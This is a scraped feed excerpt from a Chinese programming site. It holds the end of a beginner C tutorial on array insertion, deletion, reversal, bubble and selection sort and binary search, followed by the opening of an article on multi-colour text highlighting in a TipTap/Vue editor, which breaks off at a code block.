    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">//输出</span>
<span class="hljs-comment">//最大值为5</span>
</code></pre>
<h4 data-id="heading-9">3.数据插入</h4>
<h5 data-id="heading-10">就像排队插队，后面的人都要往后挪一位</h5>
<p>eg ：先输出插入前的数组 num ,再在数组 num 中第2位和第3位数字中间插入一个数字10并输出插入后的新数组</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> num[<span class="hljs-number">6</span>] = {<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>};
    <span class="hljs-type">int</span> n = <span class="hljs-number">10</span>;<span class="hljs-comment">//要插入的数字</span>
    <span class="hljs-type">int</span> position = <span class="hljs-number">2</span>;<span class="hljs-comment">//要插入的位置（第3位）（数组从0开始计数，因此此处是2）</span>
    
    <span class="hljs-comment">//打印插入前数组</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++){
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,num[i]);
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
   
   <span class="hljs-comment">//开始插入操作</span>
   <span class="hljs-comment">//从后往前，将插入位置及其之后的元素往后移一位</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">4</span>;i&gt;=position;i--){
        <span class="hljs-comment">//思考此处i为什么不能等于5？因为此时数组计数范围为0~5共6个数字，若i=5，在执行下行操作时，会变成num[6]=num[5],num[6]超过计数范围（也称越界），程序错误</span>
		num[i+<span class="hljs-number">1</span>] = num[i];
	}
        
   <span class="hljs-comment">//插入新值n</span>
	num[position] = n;
        
   <span class="hljs-comment">//打印插入后的新数组</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">6</span>;i++){
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,num[i]);
	}
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">//输出</span>
<span class="hljs-comment">//1 2 3 4 5</span>
<span class="hljs-comment">//1 2 10 3 4 5</span>
</code></pre>
<h4 data-id="heading-11">4.数据删除</h4>
<h5 data-id="heading-12">就像有人离开队伍，后面的人往前补上</h5>
<p>eg : 先输删除前的数组，再将数组中值为3的元素删除并输出删除后的新数组</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> num[<span class="hljs-number">5</span>] = {<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>};
    <span class="hljs-type">int</span> position = <span class="hljs-number">2</span>;<span class="hljs-comment">//要删除的位置（第三位）</span>
    
    <span class="hljs-comment">//打印删除前的数组</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++){
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,num[i]);
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);

    <span class="hljs-comment">//开始删除操作</span>
    <span class="hljs-comment">//从前往后，将删除位置之后的位置往前进一位</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = position+<span class="hljs-number">1</span>;i&lt;<span class="hljs-number">5</span>;i++){<span class="hljs-comment">//注意这里删除位置不参与循环，所以i=position+1</span>
		num[i<span class="hljs-number">-1</span>] = num[i];
	}
	
    <span class="hljs-comment">//打印删除后的数组</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">4</span>;i++){
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,num[i]);
	}
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">//输出</span>
<span class="hljs-comment">//1 2 3 4 5 </span>
<span class="hljs-comment">//1 2 4 5 </span>
</code></pre>
<h4 data-id="heading-13">5.数据倒置</h4>
<h5 data-id="heading-14">就像把一本书倒过来读</h5>
<p>eg : 先将原数组打印，再将数组 num 按相反顺序打印</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> num[<span class="hljs-number">5</span>] = {<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>};
    
    <span class="hljs-comment">//打印原数组</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++){
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,num[i]);
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
  
   <span class="hljs-comment">//开始倒置操作</span>
   <span class="hljs-comment">//交换第一个和最后一个，交换第二个和倒数第二个</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2</span>;i++){<span class="hljs-comment">//只需要执行 交换前一半 的操作，因此i&lt;2</span>
		<span class="hljs-type">int</span> temp = num[i];
		num[i] = num[<span class="hljs-number">4</span>-i];
		num[<span class="hljs-number">4</span>-i] = temp;
	}
   
   <span class="hljs-comment">//打印倒置后的数组</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++){
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,num[i]);
	}
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">//输出</span>
<span class="hljs-comment">//1 2 3 4 5</span>
<span class="hljs-comment">//5 4 3 2 1</span>
</code></pre>
<p>如果觉得这种方法不好理解，也可以使用另一种（也是我比较喜欢用的一种）：定义一个新的空数组，将数组 num 从后往前遍历，并依次从前往后填入新数组，新数组即为倒置后的数组num.（可以尝试一下，这里就不写出来了，我觉得很好理解(～￣▽￣)～</p>
<h4 data-id="heading-15">6.冒泡排序（每轮排出最大的数）</h4>
<h5 data-id="heading-16">就像水中的气泡，大的往上冒（虽然这么取名，但从小到大排列和从大到小排列均可用此方法）</h5>
<p><strong>这个算法我认为直接看代码和注释很抽象，很难理解，建议先上网搜索“冒泡排序算法动画演示”先看视频理解一下，我觉得帮助很大(=｀ω´=)</strong></p>
<p>eg : 先将数组 int num[5] = {2,5,4,1,3}; 打印，再将其内元素按从小到大的顺序输出</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> num[<span class="hljs-number">5</span>] = {<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>};
    
    <span class="hljs-comment">//打印原数组</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++){
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,num[i]);
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
	
    <span class="hljs-comment">//开始冒泡排序</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++){ <span class="hljs-comment">//需要比较4轮，即（数组元素个数-1）轮</span>
		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j&lt;<span class="hljs-number">4</span>-i;j++){ <span class="hljs-comment">//每轮比较次数减小</span>
			<span class="hljs-keyword">if</span>(num[j]&gt;num[j+<span class="hljs-number">1</span>]){ <span class="hljs-comment">//如果前面的比后面的大</span>
                        <span class="hljs-comment">//交换两个数</span>
				<span class="hljs-type">int</span> temp = num[j+<span class="hljs-number">1</span>];
				num[j+<span class="hljs-number">1</span>] = num[j];
				num[j] = temp;
			}
		}
	}

    <span class="hljs-comment">//打印排序后的数组</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++){
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,num[i]);
	}
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">//输出</span>
<span class="hljs-comment">//2 5 4 1 3</span>
<span class="hljs-comment">//1 2 3 4 5</span>
</code></pre>
<h4 data-id="heading-17">7.简单选择排序（每轮排出最小的数）</h4>
<h5 data-id="heading-18">就像选最小的苹果放到最前面（同6.此方法可用于从小到大和从大到小排序）</h5>
<p><strong>和冒泡排序一样，建议配合网上的执行动画一起看( ˙꒳˙ )</strong></p>
<p>eg : 先将数组 int num[5] = {2,5,4,1,3}; 打印，再将其内元素按从小到大的顺序输出</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> num[<span class="hljs-number">5</span>] = {<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>};
    
    <span class="hljs-comment">//打印原数组</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++){
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,num[i]);
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
	
    <span class="hljs-comment">//开始选择排序</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++){ <span class="hljs-comment">//需要选择4次，即（数组元素个数-1）次</span>
		<span class="hljs-type">int</span> min = i;<span class="hljs-comment">//假设最小的数是数组第i位元素</span>
		
                
                <span class="hljs-comment">//在剩下的里面找真正的最小值</span>
		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = i+<span class="hljs-number">1</span>;j&lt;<span class="hljs-number">5</span>;j++){
			<span class="hljs-keyword">if</span>(num[j]&lt;num[min]){ <span class="hljs-comment">//依次比较，找出最小值</span>
				min = j;
			}
		}
		
                <span class="hljs-comment">//若假设的最小值不是真正的最小值，则将这两个元素互换位置</span>
		<span class="hljs-keyword">if</span>(min != i){
			<span class="hljs-type">int</span> temp = num[i];
			num[i] = num[min];
			num[min] = temp;
		}
	}
       
     <span class="hljs-comment">//打印排序后的数组</span>
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">5</span>;i++){
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,num[i]);
	}
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">//输出</span>
<span class="hljs-comment">//2 5 4 1 3</span>
<span class="hljs-comment">//1 2 3 4 5</span>
</code></pre>
<h4 data-id="heading-19">8.二分查找(!!!要求数组必须是有序的）</h4>
<h5 data-id="heading-20">就像猜数字游戏，每次都猜中间值</h5>
<p>eg : 查找 num 数列中值为30的元素并打印其位置</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> num[<span class="hljs-number">5</span>] = {<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>};
    <span class="hljs-type">int</span> n = <span class="hljs-number">3</span>; <span class="hljs-comment">//要找的数</span>
    
    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>; <span class="hljs-comment">//左边起点</span>
    <span class="hljs-type">int</span> right = <span class="hljs-number">4</span>; <span class="hljs-comment">//右边起点</span>
    <span class="hljs-type">int</span> found = <span class="hljs-number">0</span>; <span class="hljs-comment">//是否找到</span>
    
    <span class="hljs-keyword">while</span>(left&lt;=right){
    	<span class="hljs-type">int</span> mid = (left+right)/<span class="hljs-number">2</span>; <span class="hljs-comment">//中间位置</span>
    	
    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"在%d到%d之间查找，中间是%d\n"</span>,left,right,mid);
    	
    	<span class="hljs-keyword">if</span>(num[mid]==n){
    		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"找到了！在第%d个位置(下标%d)\n"</span>,mid+<span class="hljs-number">1</span>,mid);
    		found = <span class="hljs-number">1</span>;
    		<span class="hljs-keyword">break</span>;<span class="hljs-comment">//找到输出，并停止循环</span>
		}
		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(num[mid]&lt;n){ <span class="hljs-comment">//中间的数小于要找的数</span>
			left = mid+<span class="hljs-number">1</span>; <span class="hljs-comment">//在右半边找</span>
		}
		<span class="hljs-keyword">else</span>{ <span class="hljs-comment">//中间的数大于要找的数</span>
			right = mid<span class="hljs-number">-1</span>; <span class="hljs-comment">//在左半边找</span>
		}
	}
	
	<span class="hljs-keyword">if</span>(!found){
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"没找到"</span>);
	}
    
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">//输出</span>
<span class="hljs-comment">//在0到4之间查找，中间是2</span>
<span class="hljs-comment">//找到了！在第3个位置（下标2）</span>
</code></pre>
<h2 data-id="heading-21">以上为本篇文章全部内容，累死我了，结束＼(￣︶￣)／！</h2></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[小说写作软件中的文本高亮功能：基于 TipTap 的多彩标记技术实现]]></title>    <link>https://juejin.cn/post/7575106644498661410</link>    <guid>https://juejin.cn/post/7575106644498661410</guid>    <pubDate>2025-11-22T15:51:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575106644498661410" data-draft-id="7575062687627149312" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="小说写作软件中的文本高亮功能：基于 TipTap 的多彩标记技术实现"/> <meta itemprop="keywords" content="Electron,Vue.js"/> <meta itemprop="datePublished" content="2025-11-22T15:51:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="龙国浪子"/> <meta itemprop="url" content="https://juejin.cn/user/1943592291275886"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            小说写作软件中的文本高亮功能：基于 TipTap 的多彩标记技术实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1943592291275886/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    龙国浪子
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T15:51:46.000Z" title="Sat Nov 22 2025 15:51:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🎨 小说写作软件中的文本高亮功能：基于 TipTap 的多彩标记技术实现</h2>
<blockquote>
<p>💡 本文深入探讨了在小说写作软件的笔记编辑器中实现文本高亮功能的技术方案，包括多颜色高亮、搜索高亮、状态管理等核心功能的完整实现，为开发者提供一套完整的文本标记解决方案。</p>
</blockquote>
<h3 data-id="heading-1">📋 目录</h3>
<ul>
<li><a href="#%E9%A1%B9%E7%9B%AE%E8%83%8C%E6%99%AF" title="#%E9%A1%B9%E7%9B%AE%E8%83%8C%E6%99%AF">项目背景</a></li>
<li><a href="#%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1" title="#%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1">技术架构设计</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0" title="#%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0">核心功能实现</a></li>
<li><a href="#%E9%AB%98%E4%BA%AE%E9%A2%9C%E8%89%B2%E9%80%89%E6%8B%A9%E5%99%A8" title="#%E9%AB%98%E4%BA%AE%E9%A2%9C%E8%89%B2%E9%80%89%E6%8B%A9%E5%99%A8">高亮颜色选择器</a></li>
<li><a href="#%E6%90%9C%E7%B4%A2%E9%AB%98%E4%BA%AE%E9%9B%86%E6%88%90" title="#%E6%90%9C%E7%B4%A2%E9%AB%98%E4%BA%AE%E9%9B%86%E6%88%90">搜索高亮集成</a></li>
<li><a href="#%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E4%B8%8E%E4%BA%A4%E4%BA%92" title="#%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E4%B8%8E%E4%BA%A4%E4%BA%92">状态管理与交互</a></li>
<li><a href="#%E6%A0%B7%E5%BC%8F%E6%B8%B2%E6%9F%93%E4%B8%8E%E4%BC%98%E5%8C%96" title="#%E6%A0%B7%E5%BC%8F%E6%B8%B2%E6%9F%93%E4%B8%8E%E4%BC%98%E5%8C%96">样式渲染与优化</a></li>
<li><a href="#%E6%8A%80%E6%9C%AF%E4%BA%AE%E7%82%B9%E6%80%BB%E7%BB%93" title="#%E6%8A%80%E6%9C%AF%E4%BA%AE%E7%82%B9%E6%80%BB%E7%BB%93">技术亮点总结</a></li>
<li><a href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B" title="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B">总结与展望</a></li>
</ul>
<h3 data-id="heading-2">🎯 项目背景</h3>
<p>在小说创作过程中，作者经常需要对笔记中的关键信息进行标记和分类，比如重要人物、地点、设定等。传统的文本编辑器往往只支持单一颜色的高亮，无法满足复杂的世界观管理需求。因此，我们在 51mazi 的笔记编辑器中设计了一个多颜色文本高亮功能，让作者能够用不同颜色标记不同类型的内容。</p>
<h4 data-id="heading-3">🎨 高亮功能展示</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0701007ddf7a4c6a895fdf563bdf7a94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z5Zu95rWq5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764431506&amp;x-signature=x4oTcWzjvMQp65C3fKBDfGeACw8%3D" alt="笔记编辑器" loading="lazy"/></p>
<p><em>多彩文本高亮功能 - 支持5种颜色标记不同类型的内容</em></p>
<h4 data-id="heading-4">✨ 核心功能特性</h4>
<ul>
<li>🎨 <strong>多颜色高亮</strong>: 支持5种颜色（黄色、绿色、蓝色、粉色、紫色）进行文本标记</li>
<li>🔍 <strong>搜索高亮</strong>: 搜索功能自动高亮匹配项，当前匹配项特殊标记</li>
<li>🎯 <strong>精确控制</strong>: 支持对选中文本应用或移除高亮</li>
<li>💾 <strong>数据持久化</strong>: 高亮信息随内容一起保存和加载</li>
<li>🎭 <strong>状态同步</strong>: 工具栏按钮状态实时反映当前选中文本的高亮状态</li>
</ul>
<h3 data-id="heading-5">🏗️ 技术架构设计</h3>
<h4 data-id="heading-6">核心技术栈</h4>
<ul>
<li><strong>TipTap 2.12.0</strong>: 基于 ProseMirror 的富文本编辑器框架</li>
<li><strong>@tiptap/extension-highlight</strong>: TipTap 官方高亮扩展</li>
<li><strong>Vue 3.5.13</strong>: 渐进式 JavaScript 框架</li>
<li><strong>Element Plus 2.10.1</strong>: 企业级 UI 组件库</li>
</ul>
<h4 data-id="heading-7">系统架构设计</h4>
<pre><code class="hljs language-markdown" lang="markdown">┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   工具栏组件     │    │   编辑器组件     │    │   TipTap扩展    │
│ EditorMenubar   │◄──►│ EditorPanel     │◄──►│ Highlight       │
└─────────────────┘    └─────────────────┘    └─────────────────┘
<span class="hljs-code">         │                       │                       │
         │                       │                       │
         ▼                       ▼                       ▼
    ┌─────────────────────────────────────────────────────┐
    │              高亮状态管理与命令执行                  │
    └─────────────────────────────────────────────────────┘
</span></code></pre>
<h4 data-id="heading-8">📁 组件结构设计</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/renderer/src/components/EditorMenubar.vue</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"editor-menubar"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 高亮按钮 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-popover</span> <span class="hljs-attr">v-model:visible</span>=<span class="hljs-string">"highlightPopoverVisible"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">reference</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">:type</span>=<span class="hljs-string">"isHighlight ? 'primary' : 'default'"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">SvgIcon</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"highlight"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- 颜色选择器 --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"highlight-color-picker"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 5种颜色选项 --&gt;</span>
        <span class="hljs-comment">&lt;!-- 移除高亮选项 --&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">el-popover</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;
</code></pre>
<h3 data-id="heading-9">🔧 核心功能实现</h3>
<h4 data-id="heading-10">1. TipTap Highlight 扩展配置</h4>
<p>TipTap 的 Highlight 扩展支持多颜色高亮，我们需要在编辑器初始化时进行配置：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/renderer/src/components/NoteEditorContent.vue</span>
